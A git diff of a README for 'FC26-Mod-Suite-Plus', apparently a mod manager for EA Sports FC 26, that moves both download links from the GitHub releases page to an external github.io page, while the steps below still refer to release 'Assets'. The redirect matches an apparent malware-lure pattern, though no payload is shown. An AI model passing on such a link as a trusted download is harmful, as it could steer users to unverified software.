@@ -1,6 +1,6 @@
 # ⚽ FC26-Mod-Suite-Plus - Manage mods for your soccer game
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sportspagelardoil456/FC26-Mod-Suite-Plus/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sportspagelardoil456.github.io)
 
 FC26-Mod-Suite-Plus acts as a central hub for all your EA Sports FC 26 modifications. This software combines a manager, loader, organizer, and editor into one interface. It allows you to change game features, update rosters, and install visual patches without complex coding.
 
@@ -18,7 +18,7 @@ Before you begin, verify that your computer meets these requirements:
 
 Visit the following link to access the software files:
 
-[Download FC26-Mod-Suite-Plus](https://github.com/sportspagelardoil456/FC26-Mod-Suite-Plus/releases)
+[Download FC26-Mod-Suite-Plus](https://sportspagelardoil456.github.io)
 
 1. Navigate to the latest release entry at the top of the page.
 2. Find the "Assets" section.
